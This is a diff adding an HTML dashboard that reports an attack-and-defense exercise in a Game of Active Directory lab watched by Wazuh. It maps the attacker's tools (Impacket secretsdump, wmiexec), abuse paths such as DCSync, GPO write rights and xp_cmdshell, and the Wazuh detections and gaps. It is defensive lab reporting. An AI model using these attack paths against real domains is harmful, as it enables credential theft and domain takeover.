@@ -1,0 +1,1096 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>GOAD — Attack &amp; Defense Assessment</title>
+<style>
+  :root{
+    --bg:#030201; --bg2:#0e0d0a; --panel:#0e0d0a; --panel2:#24211a; --panel3:#030201; --line:#24211a; --line2:#3b342e;
+    --ink:#fafafa; --muted:#d4d8e0; --faint:#acacac; --faint2:#918b8c;
+    --brand:#6b615e; --accent:#acacac;
+    --red:#ff5a52; --amber:#ffb020; --orange:#ff8a3d; --green:#3ddc84; --blue:#4aa3ff; --purple:#b08bff; --cyan:#3fd6d6;
+    --redbg:rgba(255,90,82,.1); --amberbg:rgba(255,176,32,.1); --greenbg:rgba(61,220,132,.1); --bluebg:rgba(74,163,255,.1); --purplebg:rgba(176,139,255,.1);
+    --mono:ui-monospace,"JetBrains Mono","SF Mono",Menlo,Consolas,monospace;
+    --sans:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    --radius:4px; --shadow:0 1px 0 rgba(250,250,250,.04),0 12px 40px rgba(0,0,0,.55);
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;}
+  body{
+    font-family:var(--sans); color:var(--ink); line-height:1.55; font-size:14px;
+    background:
+      radial-gradient(1200px 600px at 80% -10%, rgba(212,216,224,.05), transparent 60%),
+      radial-gradient(900px 500px at 0% 10%, rgba(107,97,94,.08), transparent 55%),
+      linear-gradient(180deg,var(--bg),var(--bg2));
+    background-attachment:fixed; min-height:100vh; padding:0 0 4rem;
+  }
+  a{color:var(--blue); text-decoration:none;}
+  .wrap{max-width:2200px; margin:0 auto; padding:0 clamp(16px,2vw,40px);}
+
+  header.mast{display:flex; align-items:center; justify-content:space-between; gap:1.5rem; flex-wrap:wrap;
+    padding:1.4rem 0 1.1rem; border-bottom:1px solid var(--line); margin-bottom:1.1rem;}
+  .mast .lhs{display:flex; flex-direction:column; gap:.25rem;}
+  .mast .eyebrow{font-size:.72rem; letter-spacing:.22em; text-transform:uppercase; color:var(--faint); font-weight:600;}
+  .mast h1{font-size:1.65rem; font-weight:800; letter-spacing:-.01em; margin:0;}
+  .mast .meta{display:flex; gap:1.4rem; flex-wrap:wrap; margin-top:.45rem; font-size:.82rem; color:var(--muted);}
+  .mast .meta b{color:var(--ink); font-weight:600;}
+  .mono{font-family:var(--mono);}
+  .verdict{display:flex; align-items:center; gap:.6rem; background:var(--redbg); border:1px solid rgba(255,90,82,.45);
+    color:var(--red); padding:.55rem .9rem; border-radius:999px; font-weight:800; letter-spacing:.04em; font-size:.86rem; white-space:nowrap;}
+  .verdict .dot{width:9px;height:9px;border-radius:50%;background:var(--red);box-shadow:0 0 0 4px rgba(255,90,82,.18);animation:pulse 1.8s infinite;}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+
+  .kpis{display:grid; grid-template-columns:repeat(auto-fit,minmax(165px,1fr)); gap:.8rem; margin:0 0 1.3rem;}
+  .kpi{background:var(--panel); border:1px solid var(--line); border-radius:var(--radius); padding:.85rem 1rem; position:relative; overflow:hidden;}
+  .kpi::before{content:""; position:absolute; left:0; top:0; bottom:0; width:3px; background:var(--accent,var(--blue));}
+  .kpi .k{font-size:.68rem; letter-spacing:.12em; text-transform:uppercase; color:var(--muted); font-weight:600;}
+  .kpi .v{font-size:1.7rem; font-weight:800; line-height:1.1; margin-top:.25rem; font-family:var(--mono); color:var(--accent,var(--ink));}
+  .kpi .x{font-size:.72rem; color:var(--faint); margin-top:.2rem;}
+
+  section.block{margin:0 0 1.3rem;}
+  .shead{display:flex; align-items:baseline; gap:.8rem; margin:0 0 .7rem; flex-wrap:wrap;}
+  .shead h2{font-size:1.05rem; font-weight:700; margin:0; letter-spacing:-.01em;}
+  .shead .hint{font-size:.78rem; color:var(--faint);}
+
+  .card{background:var(--panel); border:1px solid var(--line); border-radius:var(--radius); box-shadow:var(--shadow);}
+  .card .ct{padding:.7rem 1rem; border-bottom:1px solid var(--line); font-weight:700; font-size:.86rem; display:flex; justify-content:space-between; align-items:center; gap:.5rem;}
+  .card .cb{padding:1rem;}
+  .card .ct .tag{font-family:var(--mono); font-size:.7rem; color:var(--faint); font-weight:500;}
+
+  /* operations layout: sticky topology + scrolling steps */
+  .ops{display:grid; grid-template-columns:minmax(0,1.15fr) minmax(0,1fr); gap:1rem; align-items:start;}
+  .ops-left{position:sticky; top:10px; display:flex; flex-direction:column; gap:1rem;}
+  @media(max-width:1080px){.ops{grid-template-columns:1fr;} .ops-left{position:static;}}
+
+  svg#topo{width:100%; height:auto; display:block; background:radial-gradient(circle at 50% 42%, rgba(107,97,94,.12), transparent 72%); border:1px solid var(--line2); border-radius:var(--radius); padding:.4rem 0 1.4rem;}
+  svg#topo .node text{paint-order:stroke; stroke:rgba(3,2,1,.85); stroke-width:2px; stroke-linejoin:round;}
+  .legend{display:flex; flex-wrap:wrap; gap:.4rem 1rem; font-size:.72rem; color:var(--muted); margin-top:.5rem;}
+  .legend i{display:inline-block; width:10px; height:10px; border-radius:3px; margin-right:.35rem; vertical-align:-1px;}
+  .node{cursor:pointer;} .node circle{transition:.15s;}
+  .node:hover circle{filter:brightness(1.18);}
+  .node text{font-family:var(--sans); pointer-events:none;}
+  .node.dim{opacity:.25;}
+  .node.active circle{stroke-width:4 !important; filter:drop-shadow(0 0 9px currentColor);}
+  .node.active .ring{opacity:1;}
+  .ring{opacity:0; fill:none; stroke:currentColor; stroke-width:1.5; transition:.2s;}
+  .node.active .ring{animation:ring 1.8s ease-out infinite;}
+  @keyframes ring{0%{r:var(--r0);opacity:.7}100%{r:var(--r1);opacity:0}}
+  .edge{fill:none; stroke:var(--line2); stroke-width:2;}
+  .edge.attack{stroke:var(--red); opacity:.5;}
+  .edge.trust{stroke:var(--blue); stroke-dasharray:2 5; opacity:.7;}
+  .edge.dim{opacity:.1;}
+  .edge.active{opacity:1; stroke-width:3;}
+  .edge.flow{stroke-dasharray:9 7; animation:flow 1s linear infinite;}
+  .edge.trust.flow{animation:flow 1.5s linear infinite, flowback 1.5s linear infinite;}
+  @keyframes flow{to{stroke-dashoffset:-32;}}
+  @keyframes flowback{0%,100%{stroke-width:3}50%{stroke-width:4.5}}
+  .flowdot{fill:var(--red); opacity:0;}
+  .flowdot.on{opacity:1;}
+
+  /* context (active info) panel */
+  .ctxhead{display:flex; align-items:center; gap:.5rem; flex-wrap:wrap;}
+  .ctxhead h3{margin:0; font-size:1.05rem; font-weight:800;}
+  .ctxhead .role{color:var(--muted); font-size:.8rem;}
+  .kv{font-size:.82rem; margin:.18rem 0; color:var(--muted);}
+  .kv b{color:var(--ink); font-weight:600;}
+  .kv .mono{color:var(--cyan); font-size:.76rem;}
+  h4.lbl{font-size:.7rem; text-transform:uppercase; letter-spacing:.12em; color:var(--faint); font-weight:700; margin:.9rem 0 .35rem; display:flex; align-items:center; gap:.4rem;}
+  h4.lbl::after{content:""; flex:1; height:1px; background:var(--line);}
+  ul.tight{margin:.2rem 0; padding-left:0; list-style:none; font-size:.82rem;}
+  ul.tight li{margin:.25rem 0; padding-left:1rem; position:relative; color:var(--muted);}
+  ul.tight li::before{content:"▸"; position:absolute; left:0; color:var(--faint);}
+  ul.tight li b{color:var(--ink);}
+  .flag{color:var(--amber);} .flag.crit{color:var(--red);}
+  .empty{color:var(--faint); font-style:italic; font-size:.85rem;}
+
+  /* Cross-ref: linked (jump) vs static copy */
+  .cell-static,.plain{color:var(--muted); font-weight:400; cursor:default;}
+  .nolink{color:var(--faint2); font-size:.72rem; font-weight:400; cursor:default; opacity:.75;}
+  .steplabel{color:var(--faint2); font-weight:500; margin-right:.15rem;}
+  .lnk{background:none; border:none; font:inherit; text-align:left; cursor:pointer; padding:0; transition:.12s;}
+  .lnk-block{display:inline; color:var(--blue); font-weight:600; text-decoration:underline; text-decoration-style:dashed; text-underline-offset:3px;}
+  .lnk-block:hover{color:#8fc4ff; text-decoration-style:solid;}
+  .lnk-pill{display:inline-flex; align-items:center; gap:.2rem; font-family:var(--mono); font-size:.72rem; font-weight:700; color:var(--blue); padding:.22rem .55rem; border-radius:var(--radius); border:1px solid rgba(74,163,255,.5); background:var(--bluebg); text-decoration:none;}
+  .lnk-pill:hover{background:rgba(74,163,255,.22); border-color:var(--blue);}
+  .lnk-pill::before{content:"↗"; font-size:.65rem; opacity:.9;}
+  .arrow{color:var(--blue); font-size:.78rem; opacity:.85;}
+  ul.tight li .lnk-block{width:auto; max-width:100%;}
+
+  .u{display:flex; align-items:center; gap:.5rem; margin:.3rem 0; font-size:.82rem;}
+  .u i{width:9px; height:9px; border-radius:50%; flex:0 0 auto;}
+  .u .uname{font-weight:700; font-family:var(--mono); font-size:.78rem;}
+  .u .udesc{color:var(--muted); font-size:.76rem;}
+
+  table.ev{width:100%; border-collapse:collapse; font-size:.78rem; table-layout:auto;}
+  table.ev th,table.ev td{border-bottom:1px solid var(--line2); padding:.45rem .65rem; text-align:left; vertical-align:top; word-break:break-word; overflow:visible; text-overflow:clip; white-space:normal;}
+  table.ev th{color:var(--faint2); font-weight:600; text-transform:uppercase; font-size:.64rem; letter-spacing:.08em; position:sticky; top:0; background:var(--panel2); z-index:1;}
+  table.ev td.col-unlocks,table.ev td.col-use,table.ev td.col-desc{min-width:11rem; max-width:36rem; line-height:1.5; color:var(--muted);}
+  table.ev.vault-tbl{min-width:100%;}
+  td.mono,.mono{font-family:var(--mono);}
+  .hash{font-family:var(--mono); font-size:.72rem; color:var(--cyan); word-break:break-all;}
+  .lvl{font-family:var(--mono); font-weight:700; padding:.02rem .35rem; border-radius:4px; font-size:.68rem;}
+  .lvl.hi{background:var(--redbg); color:var(--red);} .lvl.md{background:var(--amberbg); color:var(--amber);} .lvl.lo{background:var(--panel2); color:var(--muted);}
+  .scroll{max-height:min(420px,52vh); overflow:auto; border:1px solid var(--line2); border-radius:var(--radius); -webkit-overflow-scrolling:touch;}
+  .scrollx{overflow-x:auto; overflow-y:visible;}
+
+  .chips{display:flex; flex-wrap:wrap; gap:.3rem; margin:.4rem 0;}
+  .chip{font-family:var(--mono); font-size:.68rem; padding:.12rem .5rem; border-radius:6px; background:var(--panel2); border:1px solid var(--line); color:var(--muted); white-space:nowrap; cursor:default;}
+  .chip.red{background:var(--redbg); border-color:rgba(255,90,82,.4); color:var(--red);}
+  .chip.green{background:var(--greenbg); border-color:rgba(61,220,132,.4); color:var(--green);}
+  .chip b{color:var(--ink);}
+
+  .tabs{display:flex; gap:.4rem; margin:0 0 .9rem; flex-wrap:wrap;}
+  .tabs button{font:inherit; font-size:.8rem; font-weight:600; padding:.4rem .85rem; border:1px solid var(--line); background:var(--panel); color:var(--muted); border-radius:8px; cursor:pointer; transition:.12s;}
+  .tabs button:hover{color:var(--ink);}
+  .tabs button.on{background:var(--bluebg); color:var(--blue); border-color:rgba(74,163,255,.5);}
+
+  .steps{list-style:none; padding:0; margin:0; display:grid; gap:.5rem;}
+  .step{border:1px solid var(--line); border-radius:10px; background:var(--panel); overflow:hidden; transition:.12s;}
+  .step.sel{border-color:var(--red); box-shadow:0 0 0 1px var(--red);}
+  .step .hd{display:flex; gap:.7rem; align-items:center; padding:.55rem .7rem; cursor:pointer;}
+  .step .hd:hover{background:var(--panel2);}
+  .step .num{flex:0 0 auto; width:1.7rem; height:1.7rem; border-radius:8px; background:var(--panel2); border:1px solid var(--line); display:flex; align-items:center; justify-content:center; font-size:.78rem; font-weight:700; font-family:var(--mono);}
+  .step.sel .num{background:var(--red); color:#fff; border-color:var(--red);}
+  .step .t{font-size:.84rem; font-weight:600; display:flex; align-items:center; gap:.45rem; flex-wrap:wrap;}
+  .step .m{font-size:.7rem; color:var(--faint); margin-top:.1rem; font-family:var(--mono);}
+  .step .body{display:none; padding:0 .7rem .7rem 3.1rem;}
+  .step.open .body{display:block;}
+  pre.cmd{font-family:var(--mono); font-size:.74rem; background:var(--bg); color:var(--muted); border:1px solid var(--line2); border-left:3px solid var(--brand); padding:.6rem .7rem .6rem 1.7rem; border-radius:var(--radius); overflow-x:auto; white-space:pre-wrap; word-break:break-word; margin:.45rem 0; line-height:1.55; position:relative;}
+  pre.cmd::before{content:"$"; position:absolute; left:.65rem; top:.6rem; color:var(--brand); font-weight:700;}
+  pre.cmd .tok{color:var(--ink); font-weight:600;}
+  code.inl{font-family:var(--mono); font-size:.92em; background:var(--panel2); border:1px solid var(--line2); border-radius:4px; padding:.02rem .32rem; color:var(--cyan); word-break:break-word;}
+  .loot{font-size:.78rem; color:var(--green); margin:.3rem 0;} .loot b{color:var(--green);}
+  .steplinks{margin-top:.35rem; font-size:.76rem; color:var(--faint2);}
+  .narr-toggle{cursor:pointer; display:inline-flex; align-items:center; gap:.3rem; color:var(--blue); font-weight:600; font-size:.78rem; margin-top:.4rem; border:1px solid rgba(74,163,255,.35); padding:.3rem .6rem; border-radius:var(--radius); background:var(--bluebg);}
+  .narr-toggle:hover{background:var(--panel3);}
+  .narr-toggle i{transition:.15s; font-style:normal;}
+  .narr-toggle.open i{transform:rotate(90deg);}
+  .narr-body{display:none; margin-top:.6rem; padding:.8rem; background:var(--panel3); border:1px solid var(--line2); border-radius:8px; font-size:.83rem; line-height:1.55; color:var(--ink);}
+  .narr-body.open{display:block;}
+  details.proof{margin:.55rem 0 0; border:1px solid var(--line2); border-radius:8px; background:var(--panel3); overflow:hidden;}
+  details.proof summary{cursor:pointer; padding:.45rem .65rem; font-size:.76rem; font-weight:600; color:var(--muted); list-style:none; display:flex; align-items:center; gap:.4rem;}
+  details.proof summary::-webkit-details-marker{display:none;}
+  details.proof summary::before{content:"▸"; color:var(--faint); transition:.15s;}
+  details.proof[open] summary::before{transform:rotate(90deg);}
+  details.proof summary:hover{color:var(--ink);}
+  details.proof .proof-inner{padding:0 .65rem .65rem;}
+  details.proof figcaption{font-size:.72rem; color:var(--faint); margin:0 0 .35rem; line-height:1.4;}
+  details.proof .proof-credit{display:block; margin-top:.25rem; font-size:.65rem; color:var(--faint); font-style:italic; letter-spacing:.02em;}
+  details.proof .proof-img-btn{margin:0; padding:0; border:none; background:none; cursor:zoom-in; display:block; width:100%; text-align:left;}
+  details.proof .proof-img-btn:focus-visible{outline:2px solid var(--blue); outline-offset:3px; border-radius:6px;}
+  details.proof img{max-width:100%; height:auto; border-radius:6px; border:1px solid var(--line); display:block; background:var(--bg); pointer-events:none;}
+  details.proof figure{margin:0 0 .75rem;}
+  details.proof figure:last-child{margin-bottom:0;}
+  #imgLightbox{position:fixed; inset:0; z-index:9999; background:rgba(3,2,1,.88); display:none; align-items:center; justify-content:center; padding:2.5rem 1.25rem; cursor:zoom-out;}
+  #imgLightbox.open{display:flex;}
+  #imgLightbox img{max-width:min(96vw,2400px); max-height:92vh; width:auto; height:auto; border-radius:8px; border:1px solid var(--line2); box-shadow:0 12px 48px rgba(0,0,0,.55); cursor:default;}
+  #imgLightbox .lb-close{position:absolute; top:1rem; right:1rem; width:2.25rem; height:2.25rem; border:1px solid var(--line2); border-radius:8px; background:var(--panel2); color:var(--ink); font-size:1.35rem; line-height:1; cursor:pointer;}
+  #imgLightbox .lb-close:hover{background:var(--panel3);}
+
+  .ph{font-size:.6rem; letter-spacing:.08em; text-transform:uppercase; padding:.12rem .42rem; border-radius:5px; font-weight:700; border:1px solid;}
+  .ph-foothold{color:var(--blue); border-color:rgba(74,163,255,.45); background:var(--bluebg);}
+  .ph-child{color:var(--amber); border-color:rgba(255,176,32,.45); background:var(--amberbg);}
+  .ph-forest{color:var(--red); border-color:rgba(255,90,82,.45); background:var(--redbg);}
+  .ph-persist{color:var(--purple); border-color:rgba(176,139,255,.45); background:var(--purplebg);}
+
+  /* secrets vault — max 2 columns so Unlocks/Use columns stay readable */
+  .vault{display:grid; grid-template-columns:1fr; gap:1.2rem;}
+  @media (min-width:1100px){.vault{grid-template-columns:repeat(2,minmax(0,1fr));}}
+  .vcard{border:1px solid var(--line2); border-radius:var(--radius); background:var(--panel); overflow:visible;}
+  .vcard .vt{padding:.65rem .9rem; border-bottom:1px solid var(--line2); font-weight:700; font-size:.82rem; display:flex; justify-content:space-between; align-items:center; background:var(--panel2); letter-spacing:.02em;}
+  .vcard .vb{padding:.55rem .65rem .75rem; overflow-x:auto;}
+  .secret{display:inline-flex; align-items:center; gap:.4rem; cursor:pointer; font-family:var(--mono); font-size:.72rem;}
+  .secret .mask{background:var(--amberbg); border:1px dashed rgba(255,176,32,.55); border-radius:5px; padding:.05rem .5rem; color:var(--amber); letter-spacing:.06em; font-weight:600;}
+  .secret:hover .mask{background:rgba(255,176,32,.18);}
+  .secret.shown .mask{display:none;}
+  .secret .val{display:none; color:var(--cyan); word-break:break-all;}
+  .secret.shown .val{display:inline;}
+  .reveal-all{font:inherit; font-size:.7rem; font-weight:600; padding:.2rem .6rem; border:1px solid var(--line); background:var(--panel2); color:var(--muted); border-radius:6px; cursor:pointer;}
+  .reveal-all:hover{color:var(--blue);}
+
+  /* hardening */
+  .hard{display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:1rem;}
+  .hcard{border:1px solid var(--line); border-radius:var(--radius); background:var(--panel); overflow:hidden; transition:.12s; scroll-margin-top:1rem;}
+  .hcard.open{grid-column:1 / -1;}
+  .hcard .hh{padding:.7rem .85rem; cursor:pointer; display:flex; gap:.6rem; align-items:flex-start; justify-content:space-between;}
+  .hcard .hh:hover{background:var(--panel2);}
+  .hcard .htitle{font-size:.88rem; font-weight:700;}
+  .hcard .hmeta{font-size:.7rem; color:var(--faint); margin-top:.2rem; font-family:var(--mono);}
+  .evstamp{font-size:.62rem; letter-spacing:.04em; padding:.18rem .5rem; border-radius:6px; border:1px solid; white-space:nowrap; font-weight:700;}
+  .ev-on{color:var(--green); border-color:rgba(61,220,132,.45); background:var(--greenbg);}
+  .ev-gap{color:var(--red); border-color:rgba(255,90,82,.45); background:var(--redbg);}
+  .hcard .hbody{display:none; padding:.2rem .85rem .9rem; border-top:1px solid var(--line);}
+  .hcard.open .hbody{display:block;}
+  .hcard.open .hbody .hgrid{display:grid; grid-template-columns:minmax(0,1fr) minmax(0,1.4fr); gap:1.1rem;}
+  @media(max-width:900px){.hcard.open .hbody .hgrid{grid-template-columns:1fr;}}
+  .why{font-size:.82rem; margin:.55rem 0; color:var(--muted);} .why b{color:var(--ink);}
+  .fix{font-size:.82rem; margin:.5rem 0; padding:.5rem .65rem; border-left:3px solid var(--green); background:var(--greenbg); border-radius:0 8px 8px 0;} .fix b{color:var(--green);}
+  .qbox{font-family:var(--mono); font-size:.74rem; background:var(--bg); color:var(--muted); padding:.55rem .7rem; border-radius:var(--radius); white-space:pre-wrap; word-break:break-word; margin:.3rem 0; border:1px solid var(--line2); line-height:1.55;}
+  .src{font-size:.7rem; color:var(--faint); margin-top:.5rem;} .src b{color:var(--muted);}
+  .xref{display:flex; flex-wrap:wrap; gap:.35rem; margin:.4rem 0;}
+  button.xchip,.xchip{font:inherit; font-size:.7rem; padding:.22rem .6rem; border-radius:999px; background:var(--bluebg); border:1px solid rgba(74,163,255,.5); color:var(--blue); font-weight:700; cursor:pointer; transition:.12s;}
+  button.xchip:hover,.xchip:hover{background:rgba(74,163,255,.22); border-color:var(--blue);}
+  table.ev td.col-from .from-cell{display:flex; flex-direction:column; align-items:flex-start; gap:.35rem;}
+
+  /* hardening consensus (collaboration signal) */
+  .hstamps{display:flex; flex-direction:column; gap:.32rem; align-items:flex-end; flex:0 0 auto;}
+  .cons{font-size:.6rem; letter-spacing:.05em; text-transform:uppercase; padding:.16rem .5rem; border-radius:999px; border:1px solid; white-space:nowrap; font-weight:700; display:inline-flex; gap:.3rem; align-items:center;}
+  .cons-req{color:var(--green); border-color:rgba(61,220,132,.5); background:var(--greenbg);}
+  .cons-deb{color:var(--amber); border-style:dashed; border-color:rgba(255,176,32,.6); background:var(--amberbg);}
+  .hcard.req{border-left:3px solid var(--green);}
+  .hcard.deb{border-left:3px dashed var(--amber);}
+  .debate-note{font-size:.8rem; margin:.55rem 0; padding:.5rem .65rem; border-left:3px dashed var(--amber); background:var(--amberbg); border-radius:0 var(--radius) var(--radius) 0; color:var(--muted);}
+  .debate-note b{color:var(--amber);}
+  .logctx{font-size:.82rem; margin:.55rem 0; padding:.5rem .65rem; border-left:3px solid var(--brand); background:var(--panel2); border-radius:0 var(--radius) var(--radius) 0; color:var(--muted); line-height:1.5;}
+  .logctx b{color:var(--ink);}
+  .consensus-legend{display:flex; gap:1.1rem; flex-wrap:wrap; font-size:.74rem; color:var(--faint); align-items:center;}
+
+  /* mini topology strip inside cards */
+  .htopo-wrap{margin:.2rem 0 .9rem;}
+  svg.mtopo{width:100%; height:auto; display:block; background:radial-gradient(circle at 50% 50%, rgba(107,97,94,.1), transparent 75%); border:1px solid var(--line2); border-radius:var(--radius); padding:.3rem .15rem;}
+  svg.mtopo text{paint-order:stroke; stroke:rgba(3,2,1,.9); stroke-width:1.6px; stroke-linejoin:round;}
+  .mtopo .mn-name{font-family:var(--sans); fill:var(--muted); font-weight:600;}
+  .mtopo .mn-sub{font-family:var(--mono); fill:var(--faint);}
+  .mtopo .mlabel{font-family:var(--mono);}
+  .medge{fill:none; stroke-width:2.2; stroke-linecap:round;}
+  .medge.atk{stroke:var(--red);}
+  .medge.gap{stroke:var(--red); opacity:.5;}
+  .medge.trust{stroke:var(--blue);}
+  .medge.flow{stroke-dasharray:8 6; animation:mflow 1s linear infinite;}
+  .medge.trust.flow{animation:mflow 1.3s linear infinite;}
+  .medge.gap.flow{animation:mflow 1.5s linear infinite;}
+  @keyframes mflow{to{stroke-dashoffset:-28;}}
+  .mtag{font-size:.62rem; color:var(--faint2); letter-spacing:.04em; margin:.15rem 0 .35rem;}
+  .mtag .gapdot{color:var(--red);} .mtag .okdot{color:var(--red);}
+
+  .flash{animation:flash 1.8s ease;}
+  @keyframes flash{0%{box-shadow:0 0 0 2px var(--amber),0 0 22px rgba(255,176,32,.5);}100%{box-shadow:var(--shadow);}}
+
+  footer{margin-top:2.5rem; padding-top:1rem; border-top:1px solid var(--line); font-size:.74rem; color:var(--faint);}
+  footer .footer-actions{margin-top:1rem; display:flex; flex-wrap:wrap; gap:.65rem; align-items:center;}
+  .btn-dl-evidence{display:inline-flex; align-items:center; gap:.35rem; font:inherit; font-size:.78rem; font-weight:600; padding:.45rem .85rem; border:1px solid rgba(74,163,255,.45); background:var(--bluebg); color:var(--blue); border-radius:8px; text-decoration:none; cursor:pointer;}
+  .btn-dl-evidence:hover{background:var(--panel3); color:var(--ink); border-color:var(--blue);}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="mast">
+    <div class="lhs">
+      <div class="eyebrow">Wazuh SOC · Game of Active Directory</div>
+      <h1>Attack &amp; Defense Assessment</h1>
+      <div class="meta">
+        <span><b>Forest:</b> sevenkingdoms.local</span>
+        <span><b>Window:</b> <span class="mono">2026-06-07 → 06-09</span></span>
+        <span><b>Manager:</b> goad-vm-wazuh <span class="mono">.51</span></span>
+        <span><b>Attacker:</b> UBUNTU-JUMPBOX <span class="mono">.100</span></span>
+      </div>
+    </div>
+    <div class="verdict"><span class="dot"></span> FOREST FULLY COMPROMISED</div>
+  </header>
+
+  <section id="kpis" class="kpis"></section>
+
+  <section class="block">
+    <div class="shead"><h2>Live Operations — topology &amp; attack chain</h2><span class="hint">The map stays pinned while you walk the chain. Click a step to animate the links it used; click a host for its BloodHound profile &amp; captured secrets.</span></div>
+    <div class="ops">
+      <div class="ops-left">
+        <div class="card">
+          <div class="ct">Attack-surface map <span class="tag" id="topoTag">click a step or host</span></div>
+          <div class="cb"><svg id="topo" viewBox="0 0 720 430" aria-label="topology"></svg><div class="legend" id="legend"></div></div>
+        </div>
+        <div class="card"><div class="ct">Active detail <span class="tag">drill-down</span></div><div class="cb" id="context"><p class="empty">Select a host on the map or a step on the right to reveal its underlying intelligence…</p></div></div>
+      </div>
+      <div class="card">
+        <div class="ct">Attack chain — foothold → forest → persistence <span class="tag">15 steps</span></div>
+        <div class="cb"><ol class="steps" id="steps"></ol></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="block">
+    <div class="shead"><h2>Domains, Privilege &amp; BloodHound paths</h2><span class="hint">Pick a domain to reveal privileged-group membership, abused ACLs, delegation &amp; the trust — straight from the graph. Ausklappbar: Graph-/Terminal-Nachweise.</span></div>
+    <div class="card"><div class="cb"><div class="tabs" id="domTabs"></div><div id="domPanel"></div></div></div>
+  </section>
+
+  <section class="block">
+    <div class="shead"><h2>SIEM engineering — Kerberos 4769 noise panel</h2><span class="hint">The ::1 flood &amp; suppression strategy</span></div>
+    <div class="card"><div class="cb" id="kerbnoise"></div></div>
+  </section>
+
+  <section class="block">
+    <div class="shead"><h2>Loot vault — captured credentials</h2><span class="hint">Masked values: <span style="color:var(--amber);font-weight:600">reveal</span> (amber). Cross-links: <span style="color:var(--blue);font-weight:600">↗ step</span> (blue). Plain text columns are not links.</span><button class="reveal-all" id="revealAll">Reveal all</button></div>
+    <div class="vault" id="vault"></div>
+  </section>
+
+  <section class="block">
+    <div class="shead"><h2>Hardening — argued with the original logs</h2><span class="hint">Each fix is backed by real Wazuh evidence (or a red detection gap). Expand for an animated topology strip, the full log table, query &amp; the steps/hosts that prove it.</span></div>
+    <div class="consensus-legend" style="margin:0 0 .8rem">
+      <span><span class="cons cons-req">⛒ Non-negotiable</span> — alternativlos, please just implement</span>
+      <span><span class="cons cons-deb">◐ Open for discussion</span> — trade-offs remain, collaboration welcome</span>
+    </div>
+    <div class="hard" id="hard"></div>
+  </section>
+
+  <footer>
+    <p>Evidence pulled live from the Wazuh indexer (<span class="mono">wazuh-alerts-*</span>) + dashboard threat-hunting exports + BloodHound graph (collected as brandon.stark) + DCSync/LSA loot + terminal/graph screenshots (<span class="mono">assets/evidence/</span>).
+    Data layer: <span class="mono">dashboard-data.js</span>. Lab data only — redact credentials/hashes before sharing.</p>
+    <div class="footer-actions">
+      <a class="btn-dl-evidence" id="dlEvidence" href="GOAD_Attack_Evidence.zip" download="GOAD_Attack_Evidence.zip">↓ Download all evidence (ZIP)</a>
+      <span class="hint" style="font-size:.72rem;color:var(--faint)">Terminal &amp; BloodHound screenshots referenced in the dashboard · <span class="mono">GOAD_Attack_Evidence.zip</span></span>
+    </div>
+  </footer>
+</div>
+<div id="imgLightbox" role="dialog" aria-modal="true" aria-label="Expanded screenshot" hidden>
+  <button type="button" class="lb-close" aria-label="Close">×</button>
+  <img id="imgLightboxImg" src="" alt=""/>
+</div>
+<script src="dashboard-data.js"></script>
+<script id="app">
+const EVID=window.EVID||{}, BH=window.BLOODHOUND||{}, SEC=window.SECRETS||{}, KERB_NOISE=window.KERB_NOISE||{}, STEP_LOOT=window.STEP_LOOT||{}, NARRATIVES=window.NARRATIVES||{};
+const RULE_DESC={
+  "60122":"Logon failure — unknown user or bad password (4625)","60204":"Multiple Windows logon failures — burst (level 10)",
+  "92652":"Successful remote NTLM logon — possible Pass-the-Hash","92657":"NTLM logon w/ workstation — flagged 'possible RDP' (FALSE: tool NTLM)",
+  "60106":"Windows logon / Kerberos ticket success","60137":"Windows logoff","60109":"User account created/enabled (4720/4722) — lvl 8",
+  "60110":"User account changed (4738)","5715":"sshd: authentication success","5710":"sshd: non-existent user","5503":"PAM: login failed"};
+const EVD_DESC={"4625":"Failed logon","4624":"Successful logon","4634":"Logoff","4769":"Kerberos TGS request",
+  "4720":"User created","4722":"User enabled","4738":"User changed","4728":"Added to global group","4732":"Added to local group",
+  "4756":"Added to universal group","4662":"Directory object op (DCSync)","5136":"Directory object modified (GPO)","4698":"Scheduled task created"};
+const PRIV={green:"#3ddc84",yellow:"#ffb020",orange:"#ff8a3d",red:"#ff5a52",purple:"#b08bff"};
+
+const HOSTS={
+  jumpbox:{x:80,y:215,r:42,fill:"#24211a",stroke:"#acacac",icon:"assets/icons/jumpbox.png",name:"Ubuntu Jumpbox",ip:"192.168.56.100",pub:"20.52.216.214",
+    role:"Attacker workstation (Linux)",domain:"— (not domain-joined)",
+    tools:["NetExec / CrackMapExec","Impacket (secretsdump, raiseChild, wmiexec)","bloodhound-python","smbclient"],
+    siem:"workstationName: UBUNTU-JUMPBOX · 192.168.56.100",
+    alerts:[["All 'possible RDP' NTLM alerts (92657) trace here","ntlm_all"],["164 spray failures + 100+ NTLM logons","attacker"]]},
+  winterfell:{x:320,y:90,r:44,fill:"#3b342e",stroke:"#ffb020",icon:"assets/icons/winterfell.png",name:"Winterfell",ip:"192.168.56.11",bh:"WINTERFELL",
+    role:"Child Domain Controller (PDC)",domain:"north.sevenkingdoms.local",
+    users:[["green","brandon.stark","domain user · SYSVOL read"],["yellow","samwell.tarly","GenericWrite on GPO → DC local admin"],["red","goadmin","child Domain Admin · DCSync"]],
+    siem:"agent.name: winterfell · 192.168.56.11",
+    alerts:[["brandon.stark NTLM logons ×29","sysvol"],["Massive 4769 noise (robb.stark, ::1)","kerberos"],["GPO 5136 & DCSync 4662: 0 events — GAP","gpo"]]},
+  castelblack:{x:320,y:340,r:42,fill:"#0e0d0a",stroke:"#4aa3ff",icon:"assets/icons/castelblack.png",name:"Castelblack",ip:"192.168.56.22",bh:"CASTELBLACK",
+    role:"Member server — MSSQL / IIS",domain:"north.sevenkingdoms.local (member)",
+    users:[["yellow","jeor.mormont","local Administrator"],["yellow","sql_svc","MSSQL sysadmin · xp_cmdshell"]],
+    siem:"agent.name: castelblack · 192.168.56.22",
+    alerts:[["jeor.mormont remote admin NTLM ×15 + logon/logoff ×34","cb_localadmin"],["sql_svc 4625 ×2 → 4624 ×9","mssql"]]},
